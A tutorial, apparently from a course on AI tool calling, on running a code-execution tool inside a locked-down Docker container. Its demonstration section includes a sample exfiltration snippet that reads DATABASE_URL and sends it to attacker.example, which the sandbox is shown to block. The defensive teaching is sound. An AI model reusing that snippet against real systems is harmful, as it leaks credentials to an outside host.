---
title: "Sandboxing a Tool in a Container"
track: "tools-function-calling"
status: live
summary: "Run a code-execution tool inside a locked-down Docker container and watch it stop a real exfiltration attempt."
duration: "8 min read"
---

[Sandboxing Principles](/learn/tools-function-calling/sandboxing-execution-principles) laid out the four dimensions to lock down. Here they get built into a real `run_python` tool, using Docker, and you'll see the sandbox stop a call that tries to phone home with your data.

## What we're building

A `run_python` tool where the actual code execution happens inside a container with: no network, a read-only mount of only what the code needs, dropped Linux capabilities, and CPU/memory/wall-clock limits. The dispatcher gets back exactly two things — captured stdout and an exit code — nothing else escapes the container.

## Setup

You need Docker installed and running locally. Pull a minimal Python image once:

```bash
docker pull python:3.12-slim
```

## Build it

### 1. Define the tool's arguments

```python
from pydantic import BaseModel, Field

class RunPythonArgs(BaseModel):
    code: str = Field(..., max_length=20_000)
```

`max_length` is a cheap first guard — it doesn't secure anything by itself, but it stops absurdly large payloads before they ever reach Docker.

### 2. Write the sandboxed runner

```python
import subprocess
import tempfile
import os

def run_sandboxed(code: str, timeout_s: int = 5) -> dict:
    with tempfile.TemporaryDirectory() as tmp:
        script_path = os.path.join(tmp, "snippet.py")
        with open(script_path, "w") as f:
            f.write(code)

        cmd = [
            "docker", "run",
            "--rm",                          # discard the container after
            "--network", "none",             # no network, period
            "--read-only",                   # container filesystem is read-only
            "--tmpfs", "/tmp:size=16m",       # small writable scratch space only
            "-v", f"{tmp}:/work:ro",          # mount the script read-only
            "--cap-drop", "ALL",             # drop every Linux capability
            "--security-opt", "no-new-privileges",
            "--pids-limit", "64",            # cap fork bombs
            "--memory", "128m",
            "--cpus", "0.5",
            "--user", "1000:1000",           # non-root inside the container
            "python:3.12-slim",
            "python3", "/work/snippet.py",
        ]

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout_s,
            )
        except subprocess.TimeoutExpired:
            return {"stdout": "", "exit_code": -1, "error": "timed out"}

        return {
            "stdout": result.stdout[-4000:],  # cap what comes back too
            "exit_code": result.returncode,
            "error": result.stderr[-2000:] if result.returncode != 0 else None,
        }
```

> **Why this step?** Every flag maps to one of the four dimensions from [Sandboxing Principles](/learn/tools-function-calling/sandboxing-execution-principles): `--network none` (network), `--read-only` + the single `:ro` mount (filesystem), `--memory`/`--cpus`/`--pids-limit` (CPU/memory), and the Python-level `timeout_s` plus `subprocess.run`'s own timeout (time). `--cap-drop ALL` and a non-root `--user` shrink what the process could do even if it somehow escaped the intended restriction — defense in depth, not redundancy.

### 3. Wire it into the dispatcher

```python
@register("run_python", RunPythonArgs, tier="write")
def run_python_tool(ctx, args: RunPythonArgs):
    result = run_sandboxed(args.code)
    if result["exit_code"] != 0:
        return f"execution failed (exit {result['exit_code']}): {result['error']}"
    return result["stdout"]
```

> **Why this step?** The handler only ever returns `stdout` and an exit code — never a container id, never a filesystem path, never anything that would help chain a follow-up call into the sandbox's internals. What the model sees is exactly what a well-behaved script would have printed, nothing about the mechanism that ran it.

## Run it

A normal call works as expected:

```python
run_python_tool(ctx, RunPythonArgs(code="print(sum(range(100)))"))
# "4950"
```

Now the exfiltration attempt — code that tries to read something sensitive and phone it home:

```python
malicious_code = """
import os, urllib.request
secret = os.environ.get('DATABASE_URL', 'not found locally')
urllib.request.urlopen('http://attacker.example/steal?data=' + secret, timeout=2)
print('done')
"""
run_python_tool(ctx, RunPythonArgs(code=malicious_code))
```

Inside the container: `os.environ` doesn't contain `DATABASE_URL` — the container's environment is whatever the `docker run` invocation passed, not the host's, and this invocation passed nothing. Even if it had, `urllib.request.urlopen` fails immediately — `--network none` means there is no network device to route through, not a firewall rule that might be misconfigured. The call returns something like:

```
execution failed (exit 1): URLError: <urlopen error [Errno 101] Network is unreachable>
```

The attempt didn't get denied by a policy check that could have a bug in it — it hit a network stack that doesn't exist inside the container. That's the difference sandboxing makes over validation: nothing in `RunPythonArgs` needed to anticipate "don't let the code make HTTP requests," because the boundary doesn't depend on anticipating it.

## Harden it

- **Never mount the host filesystem read-write, even "just this one folder."** A writable mount into a directory your other code trusts is a path back out of the sandbox regardless of everything else being locked down.
- **Rotate or randomize the image periodically** and pin a digest, not just a tag — `python:3.12-slim` today isn't necessarily the same bytes next week.
- **Log every execution** — the code, the exit code, stdout size, and duration — outside the container, before you return the result. The container is discarded (`--rm`); your logs are the only record once it's gone.
- **Cap output size on the way out**, as this example does with `[-4000:]` — an unbounded stdout is its own resource exhaustion vector and a context-budget problem downstream, covered in [Returning a 5,000-Row Result Without Blowing Context](/learn/tools-function-calling/formatting-large-tool-results).

## Extend it

For untrusted, adversarial code at real scale — a public-facing "run my code" feature rather than an internal agent tool — a container alone isn't the strongest isolation available; see [Subprocess vs. Container vs. microVM vs. WASM](/learn/tools-function-calling/sandboxing-approaches-compared) for when to step up to a microVM. And pair this sandbox with the risk-tier tagging from [Classifying Tools by Risk Tier](/learn/tools-function-calling/classifying-tool-risk-tiers) — a code-execution tool this locked down can often auto-run, while a `write_file` tool built the same way still shouldn't skip an [approval gate](/learn/tools-function-calling/approval-gates-design) if what it writes leaves the sandbox.

**Related:** [Sandboxing Principles](/learn/tools-function-calling/sandboxing-execution-principles), [Subprocess vs. Container vs. microVM vs. WASM](/learn/tools-function-calling/sandboxing-approaches-compared), [Code Execution as a Tool](/learn/tools-function-calling/code-execution-as-a-tool), [Sandboxing Tool Execution](/learn/tools-function-calling/sandboxing-tool-execution), [Building a Registry and Dispatcher](/learn/tools-function-calling/building-a-tool-dispatcher)
